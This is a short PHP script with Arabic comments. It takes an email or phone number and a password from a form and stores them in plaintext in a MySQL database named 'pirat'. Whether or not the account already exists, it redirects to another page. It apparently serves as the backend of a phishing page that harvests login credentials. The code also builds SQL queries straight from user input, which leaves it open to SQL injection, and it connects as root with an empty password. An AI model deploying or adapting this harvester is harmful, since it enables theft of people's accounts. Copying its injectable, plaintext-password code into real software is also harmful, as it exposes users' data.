<?php
// الاتصال بقاعدة البيانات
$servername = "localhost";  // اسم الخادم (في العادة يكون "localhost")
$username = "root";      // اسم المستخدم الخاص بقاعدة البيانات
$password = "";      // كلمة مرور قاعدة البيانات
$dbname = "pirat";   // اسم قاعدة البيانات

// إنشاء اتصال بقاعدة البيانات
$conn = new mysqli($servername, $username, $password, $dbname);

// التحقق من نجاح الاتصال
if ($conn->connect_error) {
    die("فشل الاتصال بقاعدة البيانات: " . $conn->connect_error);
}

// التحقق من طلب POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // الحصول على البيانات من النموذج
    $email_or_phone = $_POST['email_or_phone'];
    $password = $_POST['password'];

    // إعداد جملة SQL للتحقق من وجود البيانات
    $sql = "SELECT * FROM users WHERE email_or_phone = '$email_or_phone'";

    // تنفيذ جملة SQL والتحقق من وجود البيانات
    $result = $conn->query($sql);

    // التحقق من وجود البيانات
    if ($result->num_rows > 0) {
        header('location: hh.html');
    } else {
        // إعداد جملة SQL لإدخال البيانات بدون تشفير كلمة المرور
        $sql = "INSERT INTO users (email_or_phone, password) VALUES ('$email_or_phone', '$password')";

        // تنفيذ جملة SQL والتحقق من نجاح العملية
        if ($conn->query($sql) === TRUE) {
            header('location: hh.html');
        } else {
            echo "خطأ: " . $sql . "<br>" . $conn->error;
        }
    }
}

// إغلاق الاتصال بقاعدة البيانات
$conn->close();
?>